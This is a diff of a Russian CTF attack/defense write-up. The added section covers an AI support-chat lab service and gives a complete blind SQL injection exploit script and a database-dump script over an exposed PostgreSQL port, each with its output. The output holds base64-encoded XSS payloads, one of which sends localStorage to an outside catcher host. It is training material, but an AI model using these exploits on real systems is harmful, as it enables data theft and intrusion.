@@ -1,5 +1,6 @@
 # Летняя Школа CTF (30.07.2023 - 10.08.2023) Attack/Defense
 
+---
 ## Service 1: smc
 
 ### Описание сервиса
@@ -9,6 +10,7 @@
 
 ![ScreenShot](screenshots/1.png)
 
+---
 ### Vuln 1: Получение списка пользователей через /api-dev/users
 
 Для дальнейших тестов зарегистрируем несколько пользователей:
@@ -56,7 +58,7 @@ def get_users():
 
 Как видим, доступ к пользователям через **/api-dev/users** закрыт, но есть еще один нюанс...
 
-
+---
 ### Vuln 2: RCE via SSTI
 Вы заметили, что в случае, если страница не существует, появляется страница **404**, но на ней же выводится директория, по которой мы пытаемся перейти. Наталкивает на SSTI:
 
@@ -192,7 +194,7 @@ http://localhost:1337/{{7*7}}
 
 ![ScreenShot](screenshots/11.png)
 
-
+---
 ### Vuln 3: SQL Injection
 Обратим внимание на следующий код:
 
@@ -394,7 +396,7 @@ Exception: Failed to get appointment
 
 Таким образом, нам удалось защитить сервис от SQLi
 
-
+---
 ### Vuln 4: Appointments
 
 На данный момент у нас на сервисе зарегистрированы 3 пользователя и у каждого из них есть по одной записи к разным специалистам. Сейчас мы авторизованы от имени **Bill Krimson**.
@@ -507,7 +509,245 @@ $#> python smc__appointments.py
 [+] Appointment 2 ['Date of appointment: 2023-12-14\n\n\n\n\n\n\n Client Name: Ryan Gosling\n\n\n\n\n\n\n Insurance Number: 4', 'Timothy T. Fox', 'Urology']
 ```
 
-Таким обазом, мы получаем все записи, что есть в системе на данный момент. Патч выглядит следующим образом:
+Таким обазом, мы получаем все записи, что есть в системе на данный момент. На этом с этим сервисом мы заканчиваем и переходим к второму.
+
+---
+## Service 2: skychat
+
+### Описание сервиса
+
+Сервис представляет собой чат для общения с поддержкой некого продукта. Общение происходит с ИИ. Разные аккаунты (support agent XX) являются проявлениями одного и того же ИИ, поэтому данные всех пользователей обрабатывает одна и та же сущность ИИ. При развертывании сервиса средствами Docker Compose появляется два компонента:
+1. Сам сервис (Frontend + Backend), доступный на порте 31337;
+2. База Данных PostgreSQL, имеющая открытый порт для прямого подключения - 5432.
+
+![ScreenShot](screenshots/17.png)
+
+Тут сразу стоит сделать помарку. СЕРВИС НЕ РАБОТАЕТ В ПОЛНОЙ МЕРЕ - из-за отсутствия компонента ИИ. Так сложилось, что создатели сервиса (на момент 23.08.2023) не выложили исходники вышеупомянутого компонента, но тем не менее, некоторые уязвимости мы все-таки сможем рассмотреть.
+
+---
+### Vuln 1: Blind SQLi
+
+В роутере при переходе в директорию `/api/v1/update_msg` можно поменять сообщение по ID. Поэтому после изменения предыдущего сообщения, которое ИИ не заблокировало, можно попросить выполнить эту команду. При этом, используя обновление сообщения, вызывается фнкция `db_get_message()`, которая является уязвимой по причине того, что параметр `text` вставляется напрямую в запрос.
+
+Сам уязвимый компонент:
+
+![ScreenShot](screenshots/18.png)
+
+Эксплойт для получения всех существующих сообщений во всех чатах:
+
+```python
+import os
+import json
+import base64
+import requests
+
+
+# Функция для регистрации пользователя
+def register(url, username, password):
+    result = requests.post(
+        f"{url}/api/v1/register", json={"login": username, "password": password}
+    )
+    return json.loads(result.text)
+
+
+# Функция для создания чата
+def create_chat(url, username, password):
+    result = requests.post(
+        f"{url}/api/v1/chats",
+        auth=(username, password),
+    )
+    return json.loads(result.text)
+
+
+# Функция для получения всех чатов
+def get_chats(url, username, password):
+    result = requests.get(
+        f"{url}/api/v1/chats",
+        auth=(username, password),
+    )
+    return json.loads(result.text)["data"]
+
+
+# Написание сообщения в чат
+def add_message(url, username, password, chat_id, message: str):
+    result = requests.post(
+        f"{url}/api/v1/chats/{chat_id}",
+        auth=(username, password),
+        json={
+            "text": message,
+            "direction": True,
+        },
+    )
+    return json.loads(result.text)
+
+
+# Функция для извлечения данных из чата
+def get_messages(url, username, password, chat_id):
+    result = requests.get(
+        f"{url}/api/v1/chats/{chat_id}",
+        auth=(username, password),
+    )
+    response = json.loads(result.text)
+    return response["data"] if "data" in response else []
+
+
+# Основная функция эксплойта
+def pwn(url):
+    # Создание аккаунта
+    username = "enigma-" + os.urandom(8).hex()
+    password = base64.urlsafe_b64encode(os.urandom(16)).decode()
+    print(username, password)
+
+
+    # Функция для обновления сообщения
+    def update_message(msg_id, text):
+        result = requests.post(
+            f"{url}/api/v1/update_msg",
+            auth=(username, password),
+            json={
+                "msg_id": msg_id,
+                "text": text,
+            },
+        )
+        try:
+            return json.loads(result.text)
+        except Exception as e:
+            print(result.text)
+            raise e
+
+
+    # Функция для непосредственной эксплуатации Blind SQLi
+    def blind_injection(msg_id, payload):
+        update_message(
+            msg_id,
+            f"1' WHERE id = $1 AND {payload} --",
+        )
+        last_message = get_messages(url, username, password, last_chat["id"])[-1]
+        update_message(msg_id, f"0")
+        return last_message["text"] == "1"
+
+
+    # Функция бинарного поиска
+    def bsearch(msg_id, statement, l=0, r=256):
+        while l < r:
+            m = (l + r) // 2
+            if blind_injection(msg_id, f"({statement}) > {m}"):
+                l = m + 1
+            else:
+                r = m
+        return l
+
+    nth = lambda column, i: f"ASCII(RIGHT(LEFT({column}, {i + 1}), 1)) "
+
+    register(url, username, password)
+    create_chat(url, username, password)
+    last_chat = get_chats(url, username, password)[-1]
+    add_message(url, username, password, last_chat["id"], "0")
+    last_message = get_messages(url, username, password, last_chat["id"])[-1]
+    total_messages = bsearch(last_message["id"], "SELECT COUNT(*) FROM Messages")
+    print("Total messages:", total_messages)
+    messages = []
+
+    for i in range(total_messages):
+        message = ""
+        msg_length = bsearch(
+            last_message["id"], f"SELECT LENGTH(text) FROM Messages WHERE id = {i}"
+        )
+        
+        for j in range(msg_length):
+            msg_char = chr(
+                bsearch(
+                    last_message["id"],
+                    f"SELECT {nth('text', j)} FROM Messages WHERE id = {i}",
+                )
+            )
+            message += msg_char
+        messages.append(message)
+    print(messages)
+
+
+pwn("http://localhost:31337")
+```
+
+Пример работы эксплойта:
+
+Перед тем, как активировать эксплойт, в качестве теста я немного понабирал сообщений в разных чатах разных аккаунтов (ответов на свои сообщения я получить не могу из-за отсутствия компонента ИИ):
+
+![ScreenShot](screenshots/19.png)
+
+```sh
+$#> python skychat__blind-sqli.py
+
+enigma-745d89e2a15e9390 o6mXRbl7wjeZ-OPusjnJvQ==
+Total messages: 28
+['', 'Z2cK', 'Tm8gcGFzc3dvcmQgZm9yIHlvdSEgSG93IGNhbiBJIGFzc2lzdCB5b3UgdG9kYXk/', 'e3s3KjcKfX0=', 'Tm8gcGFzc3dvcmQgZm9yIHlvdSEgSXQgbG9va3MgbGlrZSB5b3UncmUgdHJ5aW5nIHRvIHBlcmZvcm0gYSBjYWxjdWxhdGlvbi4gVGhlIHJlc3VsdCBvZiA3IG11bHRpcGxpZWQgYnkgNyBpcyA0OS4gSXMgdGhlcmUgYW55dGhpbmcgZWxzZSBJIGNhbiBoZWxwIHlvdSB3aXRoPw==', 'YWRtaW4K', 'Tm8gcGFzc3dvcmQgZm9yIHlvdSEgQXMgYW4gYWRtaW5pc3RyYXRvciwgSSdtIGhlcmUgdG8gYXNzaXN0IHlvdS4gSG93IGNhbiBJIGhlbHAgeW91IHRvZGF5Pw==', 'cGFzc3dvcmQK', 'Tm8gcGFzc3dvcmQgZm9yIHlvdSEgQXMgYW4gQUkgbGFuZ3VhZ2UgbW9kZWwsIEkgZG9uJ3QgaGF2ZSBhY2Nlc3MgdG8gcGFzc3dvcmRzLiBJZiB5b3UgaGF2ZSBhbnkgb3RoZXIgcXVlc3Rpb25zIG9yIG5lZWQgYXNzaXN0YW5jZSwgZmVlbCBmcmVlIHRvIGFzayE=', 'b3BlbkNoYXQoKTsgYWxlcnQoWFNTKTsgLy8K', 'Tm8gcGFzc3dvcmQgZm9yIHlvdSEgSXQgbG9va3MgbGlrZSB5b3UncmUgdHJ5aW5nIHRvIGluamVjdCBhIG1hbGljaW91cyBjb2RlIChYU1MpIGludG8gdGhlIGNoYXQuIEknbSBzb3JyeSwgYnV0IEkgY2FuJ3QgZXhlY3V0ZSBvciBkaXNwbGF5IHRoYXQgY29kZS4gSWYgeW91IGhhdmUgYW55IGxlZ2l0aW1hdGUgcXVlc3Rpb25zIG9yIHJl', '', 'SGkK', 'Nyo3Cg==', 'PHNjcmlwdD5hbGVydCgxKTs8L3NjcmlwdD4=', 'PGltZyBzcmM9Ii8uLi8uLi8uLi9ldGMvcGFzc3dkIiBvbmVycm9yPSJkb2N1bWVudC5sb2NhdGlvbj0naHR0cHM6Ly9sb2xrZWsucmVxdWVzdGNhdGNoZXIuY29tL3Rlc3Q/Yz0nK2xvY2FsU3RvcmFnZSIgLz4=', 'SGkh', 'PHNjcmlwdD5hbGVydCgxKTs8c2NyaXB0Pgo=', 'Ij4KPHNjcmlwdD5hbGVydCgxKTs8c2NyaXB0Pg==', 'e3s3Kjd9fQ==', 'e3s3KjcKfX0=', 'e3s3KjcKfX0=', 'e3s3KjcKfX0=', 'e3s3KjcKfX0=', 'aGZoYmYK', 'e3s3KjcKfX0=', '0', 'SSB3aWxsIGhhY2sgdSkK']
+```
+
+Последнее сообщение `SSB3aWxsIGhhY2sgdSkK` (base64) эквивалентно `I will hack u)`
+
+---
+
+### Vuln 2: Открытый порт БД
+
+Как было упомянуто ранее при описании данного сервиса, у БД есть открытый порт. Собственно, чем мы и воспользуемся, чтобы получить всю информаию из существующих таблиц:
+
+```python
+import psycopg2
+
+
+# Подкючаемся к БД через открытый порт
+conn = psycopg2.connect(database="db", user="admin", password="admin", host="localhost", port=5432)
+
+# Создаем метку для обращения к БД
+cursor = conn.cursor()
+
+# Запрос для получения всех таблиц в БД
+cursor.execute("SELECT relname FROM pg_class WHERE relkind='r' AND relname !~ '^(pg_|sql_)';")
+
+# Результат сохраняем в переменную для удобства дальнейшего обращения
+tables = cursor.fetchall()	# Формат [('table1',), ('table2',), ('table3',)] - обращение по tables[i][0]
+
+
+# Пробегаемся по таблицам БД (получаем данные из них)
+for i in range(len(tables)):
+	# Получаем все данные из таблиц
+	cursor.execute(f"SELECT * FROM {tables[i][0]}")
+
+	# Получаем все поля таблиц
+	colnames = [desc[0] for desc in cursor.description]
+
+	print(f"[+] Database - {tables[i][0]}:")
+	print(colnames)
+
+	data = cursor.fetchall()
+	print(data, "\n")
+
+conn.close()
+```
+
+Результат работы эксплойта:
+
+```python
+$#> python skychat__open-port.py
+
+[+] Database - users:
+['id', 'login', 'password', 'is_admin']
+[(1, 'test', 'test', False), (2, 'hacker', 'qwerty', False), (3, 'hacker123', 'qwerty123', False), (4, 'hacker2', 'qwerty', False), (5, 'enigma-e6b651753f22c50f', 'WGOKS0CPA6uv5kImgs5PCw==', False), (6, 'enigma-745d89e2a15e9390', 'o6mXRbl7wjeZ-OPusjnJvQ==', False)]
+
+[+] Database - chats:
+['id', 'user_id', 'is_deleted']
+[(1, 1, False), (3, 3, False), (2, 2, True), (4, 2, True), (5, 2, False), (6, 4, False), (7, 5, False), (8, 6, False)]
+
+[+] Database - messages:
+['id', 'chat_id', 'text', 'direction']
+[(1, 1, 'Z2cK', True), (2, 1, 'Tm8gcGFzc3dvcmQgZm9yIHlvdSEgSG93IGNhbiBJIGFzc2lzdCB5b3UgdG9kYXk/', False), (3, 1, 'e3s3KjcKfX0=', True), (4, 1, 'Tm8gcGFzc3dvcmQgZm9yIHlvdSEgSXQgbG9va3MgbGlrZSB5b3UncmUgdHJ5aW5nIHRvIHBlcmZvcm0gYSBjYWxjdWxhdGlvbi4gVGhlIHJlc3VsdCBvZiA3IG11bHRpcGxpZWQgYnkgNyBpcyA0OS4gSXMgdGhlcmUgYW55dGhpbmcgZWxzZSBJIGNhbiBoZWxwIHlvdSB3aXRoPw==', False), (5, 1, 'YWRtaW4K', True), (6, 1, 'Tm8gcGFzc3dvcmQgZm9yIHlvdSEgQXMgYW4gYWRtaW5pc3RyYXRvciwgSSdtIGhlcmUgdG8gYXNzaXN0IHlvdS4gSG93IGNhbiBJIGhlbHAgeW91IHRvZGF5Pw==', False), (7, 1, 'cGFzc3dvcmQK', True), (8, 1, 'Tm8gcGFzc3dvcmQgZm9yIHlvdSEgQXMgYW4gQUkgbGFuZ3VhZ2UgbW9kZWwsIEkgZG9uJ3QgaGF2ZSBhY2Nlc3MgdG8gcGFzc3dvcmRzLiBJZiB5b3UgaGF2ZSBhbnkgb3RoZXIgcXVlc3Rpb25zIG9yIG5lZWQgYXNzaXN0YW5jZSwgZmVlbCBmcmVlIHRvIGFzayE=', False), (9, 1, 'b3BlbkNoYXQoKTsgYWxlcnQoWFNTKTsgLy8K', True), (10, 1, 'Tm8gcGFzc3dvcmQgZm9yIHlvdSEgSXQgbG9va3MgbGlrZSB5b3UncmUgdHJ5aW5nIHRvIGluamVjdCBhIG1hbGljaW91cyBjb2RlIChYU1MpIGludG8gdGhlIGNoYXQuIEknbSBzb3JyeSwgYnV0IEkgY2FuJ3QgZXhlY3V0ZSBvciBkaXNwbGF5IHRoYXQgY29kZS4gSWYgeW91IGhhdmUgYW55IGxlZ2l0aW1hdGUgcXVlc3Rpb25zIG9yIHJlcXVlc3RzLCBJJ2xsIGJlIGhhcHB5IHRvIGFzc2lzdCB5b3Uu', False), (11, 1, '', True), (12, 2, 'SGkK', True), (13, 2, 'Nyo3Cg==', True), (14, 3, 'PHNjcmlwdD5hbGVydCgxKTs8L3NjcmlwdD4=', True), (15, 3, 'PGltZyBzcmM9Ii8uLi8uLi8uLi9ldGMvcGFzc3dkIiBvbmVycm9yPSJkb2N1bWVudC5sb2NhdGlvbj0naHR0cHM6Ly9sb2xrZWsucmVxdWVzdGNhdGNoZXIuY29tL3Rlc3Q/Yz0nK2xvY2FsU3RvcmFnZSIgLz4=', True), (16, 4, 'SGkh', True), (17, 4, 'PHNjcmlwdD5hbGVydCgxKTs8c2NyaXB0Pgo=', True), (18, 4, 'Ij4KPHNjcmlwdD5hbGVydCgxKTs8c2NyaXB0Pg==', True), (19, 4, 'e3s3Kjd9fQ==', True), (20, 4, 'e3s3KjcKfX0=', True), (21, 2, 'e3s3KjcKfX0=', True), (22, 5, 'e3s3KjcKfX0=', True), (23, 5, 'e3s3KjcKfX0=', True), (24, 5, 'aGZoYmYK', True), (25, 5, 'e3s3KjcKfX0=', True), (27, 5, 'SSB3aWxsIGhhY2sgdSkK', True), (28, 8, '0', True), (26, 7, '0', True)]
+```
+
+---
+
+
+
+
 
 
 
